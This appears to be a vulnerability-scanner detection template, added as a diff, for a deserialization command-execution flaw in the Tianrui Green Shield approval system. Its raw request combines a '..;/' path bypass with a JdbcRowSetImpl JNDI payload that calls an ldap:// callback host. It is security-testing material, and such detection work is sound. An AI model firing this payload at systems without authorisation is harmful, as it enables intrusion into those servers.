@@ -1,0 +1,36 @@
+id: tianrui-findUserTrustees-rce
+
+info:
+  name: 天锐绿盾审批系统 findUserTrustees 存在反序列化命令执行漏洞
+  author: tianrui
+  severity: high
+  tags: tianrui
+
+http:
+  - raw:
+      - |
+        @timeout: 30s
+        POST /trwfe/login.jsp/..;/rest/ext/findUserTrustees  HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Content-Type: application/json
+
+        {
+            "userId": "admin",
+            "userName": {
+                "@type": "com.sun.rowset.JdbcRowSetImpl",
+                "dataSourceName": "ldap://{{interactsh-url}}",
+                "autoCommit": true
+            },
+            "Msgeffect": "true"
+        }
+
+    max-redirects: 3
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(interactsh_protocol, 'http') || contains(interactsh_protocol, 'dns')"
+          - "status_code == 200 || status_code == 400 || status_code == 500"
+          - 'len(body) < 10'
+        condition: and
+
